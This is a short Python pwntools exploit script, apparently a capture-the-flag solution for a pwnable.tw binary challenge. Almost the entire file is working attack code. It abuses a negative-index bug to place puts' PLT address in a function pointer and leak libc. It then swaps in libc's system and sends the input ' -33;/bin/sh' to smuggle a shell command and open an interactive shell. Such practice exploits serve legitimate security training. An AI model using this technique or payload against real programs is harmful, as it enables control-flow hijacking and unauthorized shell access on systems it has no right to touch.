#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

if len(sys.argv) == 1:
    r = process(pwn_file)
    pid = r.pid
else:
    r = remote("chall.pwnable.tw", 10202)
    pid = 0

def debug():
    gdb.attach(r, "b *0x0804A65D")

# write plt['puts'] into name ptr
# use negative integer to hijack control flow
# leak libc
r.sendafter("> ", '6')
r.sendafter("> ", '2')
r.sendafter("name: ", p32(elf.plt['puts']) + 'a')
r.sendafter("> ", "-33"+'a'*(0x80-3))
r.recv(0x80)
a = u32(r.recv(4)) - 0x9768 
info("libc: " + hex(a))
libc.address = a
r.sendlineafter("> ", '1')

# call system(" -33;/bin/sh\x00")
# note: this is a space before '-33', if not, system("-33...") will cause error.
# strtol/system is ok with a space.
r.sendafter("> ", '6')
r.sendafter("> ", '2')
r.sendafter("name: ", p32(libc.sym['system']) + 'a')
r.sendafter("> ", ' -33;/bin/sh\x00')

r.interactive()
